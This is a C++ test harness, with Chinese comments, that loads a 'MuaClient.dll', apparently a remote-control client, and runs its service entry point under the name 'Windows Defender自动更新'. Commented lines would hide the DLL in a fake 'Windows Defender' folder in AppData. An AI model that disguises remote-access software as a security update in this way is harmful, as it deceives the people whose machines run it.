// TestRunMuaClientDll.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

typedef void(*FUNC)();

int main()
{
	//HINSTANCE  hDll = LoadLibrary(L"MuaClient.dll");
	//FUNC pfnRunMuaClient = (FUNC)GetProcAddress(hDll, "WindowsDefenderAutoUpdate");
	//pfnRunMuaClient();
	//FreeLibrary(hDll);


	//WCHAR pszMuaClientDllPath[MAX_PATH];
	//SHGetSpecialFolderPath(NULL, pszMuaClientDllPath, CSIDL_APPDATA, FALSE);				// C:\Users\iyzyi\AppData\Roaming
	//wcscat_s(pszMuaClientDllPath, L"\\Windows Defender\\WindowsDefenderAutoUpdate.dll");	// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll

	//HINSTANCE  hDll = LoadLibrary(pszMuaClientDllPath);
	HINSTANCE  hDll = LoadLibrary(L"MuaClient.dll");
	FUNC pfnServiceMain = (FUNC)GetProcAddress(hDll, "ServiceMain");
	
	WCHAR pszServiceName[MAX_PATH] = L"Windows Defender自动更新";

	// 注册服务入口函数
	SERVICE_TABLE_ENTRY stDispatchTable[] = { { pszServiceName, (LPSERVICE_MAIN_FUNCTION)pfnServiceMain }, { NULL, NULL } };
	::StartServiceCtrlDispatcher(stDispatchTable);

	while (TRUE) {
		Sleep(5000);
	}
}